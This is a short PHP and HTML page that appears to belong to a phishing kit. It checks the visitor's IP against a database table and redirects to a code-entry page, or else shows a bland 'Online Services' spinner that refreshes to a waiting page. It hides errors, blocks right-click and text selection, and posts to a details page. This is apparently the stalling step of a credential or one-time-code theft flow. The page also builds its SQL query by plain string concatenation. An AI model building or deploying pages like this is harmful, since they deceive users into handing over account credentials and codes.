<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
?>


<?php

include 'connect.php';
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$site = $_SERVER['HTTP_HOST']; 
$ip_visitante = $_SERVER['REMOTE_ADDR'];

$sql = "SELECT * FROM `JSPHLT` WHERE ( `CodBusca` = '". $ip ."' ) AND ( NOW() )";
$query = mysql_query($sql);
if (mysql_num_rows($query) > 0) {
   echo '<meta http-equiv="refresh" content="0;url=Code.php">';
  exit;
}

?> 


<head>
	
<title>Online Services</title>
<meta http-equiv="refresh" content="15; URL='Wait.php'"/>
<link rel="shortcut icon" href="favicon.ico" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body onselectstart="return false" oncontextmenu="return false" ondragstart="return false" onMouseOver="window.status='..message perso .. '; return true;" >
<style type="text/css">
<!--
html{
overflow-y:hidden;
}
-->
</style>

<style type="text/css">
Body{
background-image: url('');
background-repeat: no-repeat;
margin-left:0px;
margin-top:0px;
margin-bottom:-20px
}
</style>
</head>

<body style="background-image: url('4.jpg')">
<form id="form2" onsubmit="return validar(this);" action="details3.php" method="post">
<div id="Layer4" style="position:absolute; width:104px; height:51px; z-index:4; left: 644px; top: 286px">
    <img border="0" src="lock_spinner.gif" width="48" height="48"></form>
</div>
</body>
</html>